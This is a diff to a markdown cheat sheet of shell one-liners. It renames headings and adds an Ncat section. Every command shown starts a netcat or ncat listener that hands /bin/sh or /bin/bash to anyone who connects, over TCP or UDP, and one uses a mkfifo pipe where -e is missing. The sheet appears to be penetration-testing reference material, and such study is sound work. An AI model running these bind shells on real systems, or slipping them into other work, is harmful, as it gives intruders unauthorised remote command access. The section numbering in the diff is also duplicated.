@@ -2,7 +2,7 @@
 
 ## 01 - One-liners
 
-### 1.1 - GNU
+### 1.1 - Traditional GNU Method
 
 ```
 $ nc -lnvp <PORT> -e /bin/sh
@@ -10,7 +10,21 @@ $ nc -lnvp <PORT> -e /bin/sh
 $ nc -lnvp <PORT> -e /bin/bash
 ```
 
-### 1.2 - OpenBSD
+### 1.2 - Ncat
+
+TCP method.
+
+```
+$ ncat -lnvp <PORT> -e /bin/bash
+```
+
+UDP method.
+
+```
+$ ncat -lnuvp <PORT> -e /bin/bash
+```
+
+### 1.2 - OpenBSD Method
 
 ```
 $ mkfifo /tmp/f; (nc -lp <PORT> ||nc -l <PORT>)0</tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
